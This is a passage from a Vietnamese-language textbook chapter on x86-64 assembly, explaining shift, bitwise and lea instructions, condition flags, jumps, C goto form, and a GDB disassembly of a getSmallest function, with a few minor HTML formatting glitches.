<p>Các lệnh dịch bit cho phép <strong>compiler</strong> thực hiện các phép dịch bit. Các lệnh nhân và chia thường mất nhiều thời gian để thực thi. Dịch bit mang lại cho compiler một cách rút gọn khi nhân hoặc chia với các số là lũy thừa của 2.</p>
<p>Ví dụ: để tính <code>77 * 4</code>, hầu hết compiler sẽ dịch phép toán này thành <code>77 &lt;&lt; 2</code> để tránh dùng lệnh <code>imul</code>. Tương tự, để tính <code>77 / 4</code>, compiler thường dịch thành <code>77 &gt;&gt; 2</code> để tránh dùng <code>idiv</code>.</p>
<p>Cần lưu ý rằng dịch trái và dịch phải sẽ được dịch sang các lệnh khác nhau tùy thuộc vào mục tiêu là <strong>arithmetic shift</strong> (dịch số học, có dấu) hay <strong>logical shift</strong> (dịch logic, không dấu).</p>
<div class="table-wrapper"><table><thead><tr><th>Instruction</th><th>Translation</th><th>Arithmetic or Logical?</th></tr></thead><tbody>
<tr><td><code>sal v, D</code></td><td>D <code>&lt;&lt;</code> v → D</td><td>arithmetic</td></tr>
<tr><td><code>shl v, D</code></td><td>D <code>&lt;&lt;</code> v → D</td><td>logical</td></tr>
<tr><td><code>sar v, D</code></td><td>D <code>&gt;&gt;</code> v → D</td><td>arithmetic</td></tr>
<tr><td><code>shr v, D</code></td><td>D <code>&gt;&gt;</code> v → D</td><td>logical</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 2.</strong> Các lệnh dịch bit.</p>
<p>Mỗi lệnh dịch nhận hai toán hạng: một thường là <strong>register</strong> (thanh ghi, ký hiệu D) và một là giá trị dịch (<em>v</em>). Trên hệ thống 64-bit, giá trị dịch được code hóa trong một byte (vì không hợp lý khi dịch quá 63 bit). Giá trị dịch <em>v</em> phải là hằng số hoặc được lưu trong thanh ghi <code>%cl</code>.</p>
<blockquote>
<p><strong>Different Versions of Instructions Help Distinguish Types at an Assembly Level</strong><br />
Ở mức assembly, không tồn tại khái niệm kiểu dữ liệu. Tuy nhiên, hãy nhớ rằng compiler sẽ sử dụng các <strong>component register</strong> dựa trên kiểu dữ liệu. Tương tự, hãy nhớ rằng dịch phải hoạt động khác nhau tùy thuộc vào việc giá trị là signed hay unsigned. Ở mức assembly, compiler sử dụng các lệnh khác nhau để phân biệt giữa dịch logic và dịch số học.</p>
</blockquote>
<h3 id="732-các-lệnh-thao-tác-bit-bitwise-instructions"><a class="header" href="#732-các-lệnh-thao-tác-bit-bitwise-instructions">7.3.2. Các lệnh thao tác bit (Bitwise Instructions)</a></h3>
<p>Các lệnh thao tác bit cho phép compiler thực hiện các phép toán bit trên dữ liệu. Một cách compiler sử dụng các phép toán bit là để tối ưu hóa. Ví dụ, compiler có thể chọn triển khai <code>77 mod 4</code> bằng phép <code>77 &amp; 3</code> thay vì dùng lệnh <code>idiv</code> vốn tốn kém hơn.</p>
<p><strong>Bảng 3</strong> liệt kê các lệnh bitwise phổ biến.</p>
<div class="table-wrapper"><table><thead><tr><th>Instruction</th><th>Translation</th></tr></thead><tbody>
<tr><td><code>and S, D</code></td><td>S <code>&amp;</code> D → D</td></tr>
<tr><td><code>or S, D</code></td><td>S `</td></tr>
<tr><td><code>xor S, D</code></td><td>S <code>^</code> D → D</td></tr>
<tr><td><code>not D</code></td><td><code>~</code>D → D</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 3.</strong> Các phép toán bitwise.</p>
<p>Hãy nhớ rằng phép bitwise <code>not</code> khác với phép <strong>negation</strong> (<code>neg</code>). Lệnh <code>not</code> đảo tất cả các bit nhưng không cộng thêm 1. Cần cẩn thận để không nhầm lẫn hai lệnh này.</p>
<blockquote>
<p><strong>Chỉ sử dụng các phép toán bitwise khi thật sự cần thiết trong code C của bạn!</strong><br />
Sau khi đọc xong phần này, bạn có thể sẽ bị cám dỗ muốn thay thế các phép toán số học thông thường trong code C của mình bằng các phép dịch bit hoặc các phép toán bitwise khác. Điều này <em>không</em> được khuyến khích. Hầu hết các <strong>compiler</strong> (trình biên dịch) hiện đại đủ thông minh để thay thế các phép toán số học đơn giản bằng các phép toán bitwise khi điều đó hợp lý, khiến lập trình viên không cần phải tự làm điều này. Nguyên tắc chung là lập trình viên nên ưu tiên khả năng dễ đọc của mã nguồn bất cứ khi nào có thể và tránh tối ưu hóa sớm một cách không cần thiết.</p>
</blockquote>
<h3 id="733-lệnh-load-effective-address"><a class="header" href="#733-lệnh-load-effective-address">7.3.3. Lệnh Load Effective Address</a></h3>
<p><em>What's lea got to do (got to do) with it?</em></p>
<p><em>What's lea, but an effective address loading?</em></p>
<p>~ Xin lỗi Tina Turner</p>
<p>Chúng ta cuối cùng cũng đến với <strong>load effective address</strong> hay lệnh <code>lea</code>, có lẽ là lệnh số học khiến sinh viên bối rối nhất. Lệnh này truyền thống được dùng như một cách nhanh để tính địa chỉ của một vị trí trong bộ nhớ. Lệnh <code>lea</code> hoạt động trên cùng cấu trúc <strong>operand</strong> (toán hạng) mà chúng ta đã thấy cho đến giờ, nhưng <em>không</em> bao gồm việc truy xuất bộ nhớ. Bất kể kiểu dữ liệu chứa trong toán hạng là gì (dù là một hằng số hay một địa chỉ), <code>lea</code> đơn giản chỉ thực hiện phép toán số học.</p>
<p>Ví dụ: giả sử thanh ghi <code>%rax</code> chứa giá trị hằng 0x5, thanh ghi <code>%rdx</code> chứa giá trị hằng 0x4, và thanh ghi <code>%rcx</code> chứa giá trị 0x808 (tình cờ đây là một địa chỉ). <a href="C7-x86_64/arithmetic.html#leaEx">Bảng 4</a> minh họa một số thao tác <code>lea</code> ví dụ, bản dịch của chúng và giá trị tương ứng.</p>
<div class="table-wrapper"><table><thead><tr><th>Instruction</th><th>Translation</th><th>Value</th></tr></thead><tbody>
<tr><td><code>lea 8(%rax), %rax</code></td><td>8 + <code>%rax</code> → <code>%rax</code></td><td>13 → <code>%rax</code></td></tr>
<tr><td><code>lea (%rax, %rdx), %rax</code></td><td><code>%rax</code> + <code>%rdx</code> → <code>%rax</code></td><td>9 → <code>%rax</code></td></tr>
<tr><td><code>lea (,%rax,4), %rax</code></td><td><code>%rax</code> × 4 → <code>%rax</code></td><td>20 → <code>%rax</code></td></tr>
<tr><td><code>lea -0x8(%rcx), %rax</code></td><td><code>%rcx</code> - 8 → <code>%rax</code></td><td>0x800 → <code>%rax</code></td></tr>
<tr><td><code>lea -0x4(%rcx, %rdx, 2), %rax</code></td><td><code>%rcx</code> + <code>%rdx</code> × 2 - 4 → <code>%rax</code></td><td>0x80c → <code>%rax</code></td></tr>
</tbody></table>
</div>
<p><strong>Bảng 4.</strong> Ví dụ về các thao tác <code>lea</code>.</p>
<p>Trong tất cả các trường hợp, lệnh <code>lea</code> thực hiện phép toán số học trên toán hạng nguồn S và đặt kết quả vào toán hạng đích D. Lệnh <code>mov</code> giống hệt <code>lea</code> <em>ngoại trừ</em> việc <code>mov</code> <em>bắt buộc</em> phải coi nội dung trong toán hạng nguồn là một vị trí bộ nhớ nếu nó ở dạng địa chỉ bộ nhớ. Ngược lại, <code>lea</code> thực hiện cùng phép toán (đôi khi phức tạp) trên toán hạng <em>mà không</em> truy xuất bộ nhớ, cho phép compiler khéo léo sử dụng <code>lea</code> như một sự thay thế cho một số loại phép toán số học.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="74-Điều-khiển-có-điều-kiện-và-vòng-lặp-conditional-control-and-loops"><a class="header" href="#74-Điều-khiển-có-điều-kiện-và-vòng-lặp-conditional-control-and-loops">7.4. Điều khiển có điều kiện và Vòng lặp (Conditional Control and Loops)</a></h2>
<p>Phần này đề cập đến các lệnh assembly x86 dành cho <a href="C7-x86_64/../C1-C_intro/conditionals.html#_conditionals_and_loops">conditionals và loops</a>.<br />
Hãy nhớ rằng các câu lệnh điều kiện cho phép lập trình viên thay đổi luồng thực thi của chương trình dựa trên kết quả của một biểu thức điều kiện. <strong>Compiler</strong> sẽ dịch các câu lệnh điều kiện thành các lệnh assembly điều chỉnh <strong>instruction pointer</strong> (<code>%rip</code>) để trỏ tới một địa chỉ <strong>không</strong> phải là địa chỉ tiếp theo trong chuỗi lệnh của chương trình.</p>
<div style="break-before: page; page-break-before: always;"></div><h3 id="741-kiến-thức-chuẩn-bị-preliminaries"><a class="header" href="#741-kiến-thức-chuẩn-bị-preliminaries">7.4.1. Kiến thức chuẩn bị (Preliminaries)</a></h3>
<h3 id="các-lệnh-so-sánh-có-điều-kiện-conditional-comparison-instructions"><a class="header" href="#các-lệnh-so-sánh-có-điều-kiện-conditional-comparison-instructions">Các lệnh so sánh có điều kiện (Conditional Comparison Instructions)</a></h3>
<p>Các <strong>comparison instruction</strong> (lệnh so sánh) thực hiện một phép toán số học nhằm phục vụ cho việc điều khiển thực thi có điều kiện của chương trình. <a href="C7-x86_64/preliminaries.html#ConditionalControl">Bảng 1</a> liệt kê các lệnh cơ bản liên quan đến <strong>conditional control</strong> (điều khiển có điều kiện).</p>
<div class="table-wrapper"><table><thead><tr><th>Instruction</th><th>Translation</th></tr></thead><tbody>
<tr><td><code>cmp R1, R2</code></td><td>So sánh R2 với R1 (tức tính R2 - R1)</td></tr>
<tr><td><code>test R1, R2</code></td><td>Tính toán R1 &amp; R2 (bitwise AND)</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 1.</strong> Các lệnh điều khiển có điều kiện.</p>
<p>Lệnh <code>cmp</code> so sánh giá trị của hai thanh ghi R2 và R1. Cụ thể, nó thực hiện phép trừ R1 khỏi R2.<br />
Lệnh <code>test</code> thực hiện phép <strong>bitwise AND</strong>. Một ví dụ thường gặp:</p>
<pre><code>test %rax, %rax
</code></pre>
<p>Trong ví dụ này, phép AND từng bit của <code>%rax</code> với chính nó sẽ cho kết quả bằng 0 <strong>chỉ khi</strong> <code>%rax</code> chứa giá trị 0. Nói cách khác, đây là cách kiểm tra giá trị zero và tương đương với:</p>
<pre><code>cmp $0, %rax
</code></pre>
<p>Không giống các lệnh số học đã đề cập trước đó, <code>cmp</code> và <code>test</code> <strong>không</strong> thay đổi thanh ghi đích. Thay vào đó, cả hai lệnh này thay đổi một tập hợp các giá trị 1-bit gọi là <strong>condition code flags</strong> (cờ code điều kiện).<br />
Ví dụ, <code>cmp</code> sẽ thay đổi các cờ này dựa trên việc giá trị R2 - R1 là dương (greater), âm (less) hay bằng 0 (equal). Hãy nhớ rằng <a href="C7-x86_64/../C5-Arch/cpu.html#_the_alu">condition code</a> lưu trữ thông tin về một phép toán trong ALU. Các condition code flags là một phần của thanh ghi <code>FLAGS</code> trên hệ thống x86.</p>
<div class="table-wrapper"><table><thead><tr><th>Flag</th><th>Translation</th></tr></thead><tbody>
<tr><td><code>ZF</code></td><td>Bằng 0 (1: đúng; 0: sai)</td></tr>
<tr><td><code>SF</code></td><td>Âm (1: đúng; 0: sai)</td></tr>
<tr><td><code>OF</code></td><td>Xảy ra tràn số (1: đúng; 0: sai)</td></tr>
<tr><td><code>CF</code></td><td>Xảy ra carry trong phép toán (1: đúng; 0: sai)</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 2.</strong> Các cờ condition code thông dụng.</p>
<p>Xét lại lệnh <code>cmp R1, R2</code>:</p>
<ul>
<li><code>ZF</code> được đặt thành 1 nếu R1 và R2 bằng nhau.</li>
<li><code>SF</code> được đặt thành 1 nếu R2 <em>nhỏ hơn</em> R1 (R2 - R1 cho kết quả âm).</li>
<li><code>OF</code> được đặt thành 1 nếu phép R2 - R1 gây tràn số nguyên (hữu ích cho so sánh số có dấu).</li>
<li><code>CF</code> được đặt thành 1 nếu phép R2 - R1 gây carry (hữu ích cho so sánh số không dấu).</li>
</ul>
<p><code>SF</code> và <code>OF</code> được dùng cho so sánh số nguyên có dấu, trong khi <code>CF</code> được dùng cho so sánh số nguyên không dấu.<br />
Mặc dù việc tìm hiểu sâu về condition code flags vượt ra ngoài phạm vi cuốn sách này, nhưng việc <code>cmp</code> và <code>test</code> thiết lập các cờ này là điều kiện cần để nhóm lệnh tiếp theo (<em>jump instructions</em>) hoạt động chính xác.</p>
<h3 id="các-lệnh-nhảy-jump-instructions"><a class="header" href="#các-lệnh-nhảy-jump-instructions">Các lệnh nhảy (Jump Instructions)</a></h3>
<p><strong>Jump instruction</strong> cho phép chương trình “nhảy” tới một vị trí mới trong code lệnh. Trong các chương trình assembly mà ta đã phân tích, <code>%rip</code> luôn trỏ tới lệnh kế tiếp trong bộ nhớ chương trình. Lệnh nhảy cho phép <code>%rip</code> được đặt tới một lệnh mới chưa từng thực thi (như trong câu lệnh <code>if</code>) hoặc tới một lệnh đã thực thi trước đó (như trong vòng lặp).</p>
<h4 id="lệnh-nhảy-trực-tiếp-direct-jump-instructions"><a class="header" href="#lệnh-nhảy-trực-tiếp-direct-jump-instructions">Lệnh nhảy trực tiếp (Direct jump instructions)</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Instruction</th><th>Description</th></tr></thead><tbody>
<tr><td><code>jmp L</code></td><td>Nhảy tới vị trí được chỉ định bởi nhãn L</td></tr>
<tr><td><code>jmp *addr</code></td><td>Nhảy tới địa chỉ được chỉ định</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 3.</strong> Các lệnh nhảy trực tiếp.</p>
<p>Trong đó, <code>L</code> là <strong>symbolic label</strong> (nhãn ký hiệu), đóng vai trò định danh trong tệp đối tượng của chương trình.<br />
Tất cả nhãn gồm một chuỗi chữ và số, theo sau là dấu hai chấm. Nhãn có thể là <em>local</em> hoặc <em>global</em> trong phạm vi tệp đối tượng. Nhãn của hàm thường là <em>global</em> và thường gồm tên hàm kèm dấu hai chấm, ví dụ <code>main:</code> (hoặc <code>&lt;main&gt;:</code>) dùng để đánh dấu hàm <code>main</code> do người dùng định nghĩa. Theo quy ước, nhãn <em>local</em> thường bắt đầu bằng dấu chấm, ví dụ <code>.L1</code> trong ngữ cảnh câu lệnh <code>if</code> hoặc vòng lặp.</p>
<p>Mỗi nhãn đều có một địa chỉ gắn liền. Khi CPU thực thi lệnh <code>jmp</code>, nó sẽ thay đổi <code>%rip</code> thành địa chỉ chương trình được chỉ định bởi nhãn <code>L</code>. Lập trình viên cũng có thể chỉ định trực tiếp một địa chỉ để nhảy tới bằng <code>jmp *</code>.<br />
Đôi khi, nhãn local được hiển thị dưới dạng offset so với đầu hàm. Ví dụ, một lệnh cách đầu hàm <code>main</code> 28 byte có thể được biểu diễn là <code>&lt;main+28&gt;</code>.</p>
<p>Ví dụ:<br />
<code>jmp 0x8048427 &lt;main+28&gt;</code> nghĩa là nhảy tới địa chỉ <code>0x8048427</code>, nhãn <code>&lt;main+28&gt;</code> cho biết nó cách địa chỉ bắt đầu của hàm <code>main</code> 28 byte. Thực thi lệnh này sẽ đặt <code>%rip</code> thành <code>0x8048427</code>.</p>
<h4 id="lệnh-nhảy-có-điều-kiện-conditional-jump-instructions"><a class="header" href="#lệnh-nhảy-có-điều-kiện-conditional-jump-instructions">Lệnh nhảy có điều kiện (Conditional jump instructions)</a></h4>
<p>Hành vi của <strong>conditional jump instruction</strong> phụ thuộc vào các thanh ghi condition code được thiết lập bởi lệnh <code>cmp</code>. <strong>Bảng 4</strong> liệt kê các lệnh nhảy có điều kiện thông dụng.<br />
Mỗi lệnh bắt đầu bằng chữ <code>j</code> (jump). Hậu tố của lệnh cho biết <em>điều kiện</em> để nhảy. Hậu tố này cũng xác định việc so sánh số được hiểu là có dấu hay không dấu.</p>
<div class="table-wrapper"><table><thead><tr><th>Signed Comparison</th><th>Unsigned Comparison</th><th>Description</th></tr></thead><tbody>
<tr><td><code>je</code> (<code>jz</code>)</td><td></td><td>Nhảy nếu bằng nhau (==) hoặc nếu zero</td></tr>
<tr><td><code>jne</code> (<code>jnz</code>)</td><td></td><td>Nhảy nếu không bằng (!=)</td></tr>
<tr><td><code>js</code></td><td></td><td>Nhảy nếu âm</td></tr>
<tr><td><code>jns</code></td><td></td><td>Nhảy nếu không âm</td></tr>
<tr><td><code>jg</code> (<code>jnle</code>)</td><td><code>ja</code> (<code>jnbe</code>)</td><td>Nhảy nếu lớn hơn (&gt;)</td></tr>
<tr><td><code>jge</code> (<code>jnl</code>)</td><td><code>jae</code> (<code>jnb</code>)</td><td>Nhảy nếu lớn hơn hoặc bằng (&gt;=)</td></tr>
<tr><td><code>jl</code> (<code>jnge</code>)</td><td><code>jb</code> (<code>jnae</code>)</td><td>Nhảy nếu nhỏ hơn (&lt;)</td></tr>
<tr><td><code>jle</code> (<code>jng</code>)</td><td><code>jbe</code> (<code>jna</code>)</td><td>Nhảy nếu nhỏ hơn hoặc bằng (&lt;=)</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 4.</strong> Các lệnh nhảy có điều kiện thông dụng.</p>
<p><strong>Bảng 4.</strong> Các lệnh nhảy có điều kiện; các từ đồng nghĩa được hiển thị trong ngoặc đơn.</p>
<p>Thay vì ghi nhớ tất cả các lệnh nhảy có điều kiện khác nhau này, sẽ hữu ích hơn nếu bạn “đọc thành tiếng” các hậu tố (suffix) của lệnh. <a href="C7-x86_64/preliminaries.html#JmpSuffixes">Bảng 5</a> liệt kê các chữ cái thường gặp trong lệnh nhảy và từ tương ứng của chúng.</p>
<div class="table-wrapper"><table><thead><tr><th>Letter</th><th>Word</th></tr></thead><tbody>
<tr><td><code>j</code></td><td>jump</td></tr>
<tr><td><code>n</code></td><td>not</td></tr>
<tr><td><code>e</code></td><td>equal</td></tr>
<tr><td><code>s</code></td><td>signed</td></tr>
<tr><td><code>g</code></td><td>greater (diễn giải theo số có dấu)</td></tr>
<tr><td><code>l</code></td><td>less (diễn giải theo số có dấu)</td></tr>
<tr><td><code>a</code></td><td>above (diễn giải theo số không dấu)</td></tr>
<tr><td><code>b</code></td><td>below (diễn giải theo số không dấu)</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 5.</strong> Hậu tố của lệnh nhảy.</p>
<p>Khi đọc thành tiếng, ta có thể thấy <code>jg</code> tương ứng với <em>jump greater</em> và từ đồng nghĩa trong so sánh có dấu của nó là <code>jnl</code>, nghĩa là <em>jump not less</em>. Tương tự, phiên bản so sánh không dấu <code>ja</code> nghĩa là <em>jump above</em>, trong khi từ đồng nghĩa <code>jnbe</code> nghĩa là <em>jump not below or equal</em>.</p>
<p>Nếu bạn đọc thành tiếng các lệnh này, điều đó sẽ giúp giải thích tại sao một số từ đồng nghĩa lại tương ứng với những lệnh cụ thể. Một điều khác cần nhớ là các thuật ngữ <em>greater</em> và <em>less</em> yêu cầu CPU diễn giải phép so sánh số dưới dạng <strong>có dấu</strong>, trong khi <em>above</em> và <em>below</em> cho biết phép so sánh số là <strong>không dấu</strong>.</p>
<h3 id="câu-lệnh-goto"><a class="header" href="#câu-lệnh-goto">Câu lệnh <code>goto</code></a></h3>
<p>Trong các tiểu mục tiếp theo, chúng ta sẽ xem xét các câu lệnh điều kiện và vòng lặp trong assembly và phân tích ngược chúng trở lại thành C. Khi dịch code assembly của các câu lệnh điều kiện và vòng lặp về C, sẽ hữu ích nếu hiểu được dạng <code>goto</code> tương ứng trong ngôn ngữ C.</p>
<p>Câu lệnh <code>goto</code> là một primitive trong C, buộc chương trình chuyển luồng thực thi sang một dòng khác trong code. Lệnh assembly tương ứng với câu lệnh <code>goto</code> là <code>jmp</code>.</p>
<p>Câu lệnh <code>goto</code> bao gồm từ khóa <code>goto</code> theo sau là một <strong>goto label</strong> (nhãn goto), là một loại nhãn chương trình cho biết nơi thực thi sẽ tiếp tục. Ví dụ, <code>goto done</code> nghĩa là chương trình sẽ nhảy tới dòng được đánh dấu bằng nhãn <code>done</code>.</p>
<p>Các ví dụ khác về nhãn chương trình trong C bao gồm <a href="C7-x86_64/../C2-C_depth/advanced_switch.html#_c_switch_stmt_">nhãn của câu lệnh switch</a> đã được đề cập trong Chương 2.</p>
<table>
  <thead>
    <tr>
      <th>Regular C version</th>
      <th>Goto version</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
<pre><code>
int getSmallest(int x, int y) {
    int smallest;
<pre><code>if ( x &gt; y ) { //if (conditional)
    smallest = y; //then statement
}
else {
    smallest = x; //else statement
}
return smallest;
</code></pre>
<p>}
</code></pre>
</td>
<td></p>
<pre><code>
int getSmallest(int x, int y) {
    int smallest;

    if (x &lt;= y ) { //if (!conditional)
        goto else_statement;
    }

    smallest = y; //then statement
    goto done;
else_statement:
    smallest = x; //else statement
done:
    return smallest;
}
</code></pre>
</tbody>
</table>
<p><strong>Bảng 6.</strong> So sánh một hàm C và dạng <code>goto</code> tương ứng.</p>
<p><strong>Bảng 6</strong> minh họa hàm <code>getSmallest()</code> được viết bằng C thông thường và dạng <code>goto</code> tương ứng trong C. Hàm <code>getSmallest()</code> so sánh giá trị của hai số nguyên (<code>x</code> và <code>y</code>), và gán giá trị nhỏ hơn cho biến <code>smallest</code>.</p>
<p>Dạng <code>goto</code> của hàm này có thể trông hơi phản trực giác, nhưng hãy phân tích chính xác điều gì đang diễn ra. Câu lệnh điều kiện kiểm tra xem biến <code>x</code> có nhỏ hơn hoặc bằng <code>y</code> hay không.</p>
<ul>
<li>
<p>Nếu <code>x</code> nhỏ hơn hoặc bằng <code>y</code>, chương trình sẽ chuyển quyền điều khiển tới nhãn <code>else_statement</code>, nơi chứa câu lệnh duy nhất <code>smallest = x</code>. Vì chương trình thực thi tuần tự, nó sẽ tiếp tục thực thi phần code dưới nhãn <code>done</code>, trả về giá trị của <code>smallest</code> (<code>x</code>).</p>
</li>
<li>
<p>Nếu <code>x</code> lớn hơn <code>y</code>, <code>smallest</code> được gán giá trị <code>y</code>. Sau đó, chương trình thực thi câu lệnh <code>goto done</code>, chuyển quyền điều khiển tới nhãn <code>done</code>, trả về giá trị của <code>smallest</code> (<code>y</code>).</p>
</li>
</ul>
<p>Mặc dù câu lệnh <code>goto</code> từng được sử dụng phổ biến trong những ngày đầu của lập trình, nhưng việc sử dụng <code>goto</code> trong code hiện đại được coi là <strong>thói quen xấu</strong>, vì nó làm giảm khả năng đọc hiểu của code. Thực tế, nhà khoa học máy tính Edsger Dijkstra đã viết một bài báo nổi tiếng chỉ trích việc sử dụng <code>goto</code> với tiêu đề <em>Go To Statement Considered Harmful</em><sup class="footnote-reference"><a href="#1">1</a></sup>.</p>
<p>Nói chung, các chương trình C được thiết kế tốt sẽ không sử dụng <code>goto</code>, và lập trình viên được khuyến cáo tránh dùng để không viết ra code khó đọc, khó gỡ lỗi và khó bảo trì. Tuy nhiên, câu lệnh <code>goto</code> trong C vẫn quan trọng để hiểu, vì GCC thường chuyển đổi code C có điều kiện sang dạng <code>goto</code> trước khi dịch sang assembly, bao gồm cả code chứa câu lệnh <code>if</code> và vòng lặp.</p>
<p>Các tiểu mục tiếp theo sẽ trình bày chi tiết hơn về cách biểu diễn câu lệnh <code>if</code> và vòng lặp trong assembly:</p>
<ul>
<li><a href="C7-x86_64/if_statements.html#_if_statements_in_assembly">If Statements</a></li>
<li>Loops</li>
</ul>
<h3 id="tài-liệu-tham-khảo-1"><a class="header" href="#tài-liệu-tham-khảo-1">Tài liệu tham khảo</a></h3>
<div class="footnote-definition" id="1"><sup class="footnote-definition-label">1</sup>
<p>Edsger Dijkstra. &quot;Go To Statement Considered Harmful&quot;. <em>Communications of the ACM</em> 11(3), trang 147–148, 1968.</p>
</div>
<div style="break-before: page; page-break-before: always;"></div><h3 id="742-câu-lệnh-if-trong-assembly"><a class="header" href="#742-câu-lệnh-if-trong-assembly">7.4.2. Câu lệnh if trong Assembly</a></h3>
<p>Hãy cùng xem hàm <code>getSmallest</code> ở dạng assembly. Để tiện theo dõi, hàm được trích lại dưới đây:</p>
<pre><code class="language-c">int getSmallest(int x, int y) {
    int smallest;
    if ( x &gt; y ) {
        smallest = y;
    }
    else {
        smallest = x;
    }
    return smallest;
}
</code></pre>
<p>Mã assembly tương ứng được trích xuất từ GDB trông tương tự như sau:</p>
<pre><code>(gdb) disas getSmallest
Dump of assembler code for function getSmallest:
   0x40059a &lt;+4&gt;:   mov    %edi,-0x14(%rbp)
   0x40059d &lt;+7&gt;:   mov    %esi,-0x18(%rbp)
   0x4005a0 &lt;+10&gt;:  mov    -0x14(%rbp),%eax
   0x4005a3 &lt;+13&gt;:  cmp    -0x18(%rbp),%eax
   0x4005a6 &lt;+16&gt;:  jle    0x4005b0 &lt;getSmallest+26&gt;
   0x4005a8 &lt;+18&gt;:  mov    -0x18(%rbp),%eax
   0x4005ae &lt;+24&gt;:  jmp    0x4005b9 &lt;getSmallest+35&gt;
   0x4005b0 &lt;+26&gt;:  mov    -0x14(%rbp),%eax
   0x4005b9 &lt;+35&gt;:  pop    %rbp
   0x4005ba &lt;+36&gt;:  retq
</code></pre>
<p>Đây là một cách hiển thị khác của code assembly so với những gì ta đã thấy trước đây. Ở đây, ta có thể thấy <strong>địa chỉ</strong> gắn với mỗi lệnh, nhưng không thấy <strong>byte</strong> code máy. Lưu ý rằng đoạn assembly này đã được chỉnh sửa nhẹ để đơn giản hóa. Các lệnh thường xuất hiện khi tạo hàm (tức <code>push %rbp</code>, <code>mov %rsp, %rbp</code>) đã được lược bỏ. Theo quy ước, GCC đặt tham số thứ nhất và thứ hai của hàm vào các thanh ghi <code>%rdi</code> và <code>%rsi</code>. Vì các tham số của <code>getSmallest</code> có kiểu <code>int</code>, compiler đặt chúng vào các <strong>component register</strong> tương ứng là <code>%edi</code> và <code>%esi</code>. Để dễ theo dõi, ta sẽ gọi các tham số này lần lượt là <code>x</code> và <code>y</code>.</p>
<p>Hãy lần lượt phân tích một số dòng đầu tiên của đoạn code assembly trên. Lưu ý rằng trong ví dụ này, chúng ta sẽ không vẽ stack một cách tường minh. Đây là một bài tập để bạn tự thực hành kỹ năng theo dõi stack.</p>
<ul>
<li>
<p>Lệnh <code>mov</code> đầu tiên sao chép giá trị trong thanh ghi <code>%edi</code> (tham số thứ nhất, <code>x</code>) và đặt nó vào vị trí bộ nhớ <code>%rbp-0x14</code> trên call stack. Instruction pointer (<code>%rip</code>) được đặt tới địa chỉ của lệnh tiếp theo, 0x40059d.</p>
</li>
<li>
<p>Lệnh <code>mov</code> thứ hai sao chép giá trị trong thanh ghi <code>%esi</code> (tham số thứ hai, <code>y</code>) và đặt nó vào vị trí bộ nhớ <code>%rbp-0x18</code> trên call stack. <code>%rip</code> được cập nhật trỏ tới địa chỉ của lệnh tiếp theo, 0x4005a0.</p>
</li>
<li>
<p>Lệnh <code>mov</code> thứ ba sao chép <code>x</code> vào thanh ghi <code>%eax</code>. <code>%rip</code> được cập nhật trỏ tới địa chỉ của lệnh tiếp theo trong chuỗi.</p>
</li>
<li>
<p>Lệnh <code>cmp</code> so sánh giá trị tại vị trí <code>%rbp-0x18</code> (tham số thứ hai, <code>y</code>) với <code>x</code> và thiết lập các <strong>condition code flag register</strong> phù hợp. <code>%rip</code> tăng tới địa chỉ của lệnh tiếp theo, 0x4005a6.</p>
</li>
<li>
<p>Lệnh <code>jle</code> tại địa chỉ 0x4005a6 cho biết nếu <code>x</code> nhỏ hơn hoặc bằng <code>y</code>, lệnh tiếp theo sẽ được thực thi ở vị trí <code>&lt;getSmallest+26&gt;</code> và <code>%rip</code> sẽ được đặt thành 0x4005b0. Ngược lại, <code>%rip</code> sẽ được đặt tới lệnh tiếp theo trong chuỗi, 0x4005a8.</p>
</li>
</ul>
<p>Các lệnh tiếp theo sẽ phụ thuộc vào việc chương trình có thực hiện nhánh (jump) tại địa chỉ 0x4005a6 hay không.</p>
<p><strong>Trường hợp 1:</strong> Nhánh <em>không</em> được thực hiện. Khi đó, <code>%rip</code> được đặt thành 0x4005a8 (<code>&lt;getSmallest+18&gt;</code>) và chuỗi lệnh sau sẽ chạy:</p>
<ul>
<li>
<p>Lệnh <code>mov -0x18(%rbp), %eax</code> tại <code>&lt;getSmallest+18&gt;</code> sao chép <code>y</code> vào <code>%eax</code>. <code>%rip</code> tăng lên 0x4005ae.</p>
</li>
<li>
<p>Lệnh <code>jmp</code> tại <code>&lt;getSmallest+24&gt;</code> đặt <code>%rip</code> thành 0x4005b9.</p>
</li>
<li>
<p>Các lệnh cuối cùng được thực thi là <code>pop %rbp</code> và <code>retq</code>, dọn dẹp stack và trả về từ lời gọi hàm. Trong trường hợp này, <code>y</code> nằm trong thanh ghi trả về.</p>
</li>
</ul>
<p><strong>Trường hợp 2:</strong> Nhánh được thực hiện tại <code>&lt;getSmallest+16&gt;</code>. Nói cách khác, lệnh <code>jle</code> đặt <code>%rip</code> thành 0x4005b0 (<code>&lt;getSmallest+26&gt;</code>). Khi đó, các lệnh tiếp theo là:</p>
<ul>
<li>
<p>Lệnh <code>mov -0x14(%rbp), %eax</code> tại địa chỉ 0x4005b0 sao chép <code>x</code> vào <code>%eax</code>. <code>%rip</code> tăng lên 0x4005b9.</p>
</li>
<li>
<p>Các lệnh cuối cùng được thực thi là <code>pop %rbp</code> và <code>retq</code>, dọn dẹp stack và trả về giá trị trong thanh ghi trả về. Trong trường hợp này, <code>%eax</code> chứa <code>x</code>, và <code>getSmallest</code> trả về <code>x</code>.</p>
</li>
</ul>
<p>Chúng ta có thể chú thích đoạn assembly trên như sau:</p>
<pre><code>0x40059a &lt;+4&gt;:  mov %edi,-0x14(%rbp)          # copy x to %rbp-0x14
0x40059d &lt;+7&gt;:  mov %esi,-0x18(%rbp)          # copy y to %rbp-0x18
0x4005a0 &lt;+10&gt;: mov -0x14(%rbp),%eax          # copy x to %eax
0x4005a3 &lt;+13&gt;: cmp -0x18(%rbp),%eax          # compare x with y
0x4005a6 &lt;+16&gt;: jle 0x4005b0 &lt;getSmallest+26&gt; # if x&lt;=y goto &lt;getSmallest+26&gt;
0x4005a8 &lt;+18&gt;: mov -0x18(%rbp),%eax          # copy y to %eax
0x4005ae &lt;+24&gt;: jmp 0x4005b9 &lt;getSmallest+35&gt; # goto &lt;getSmallest+35&gt;
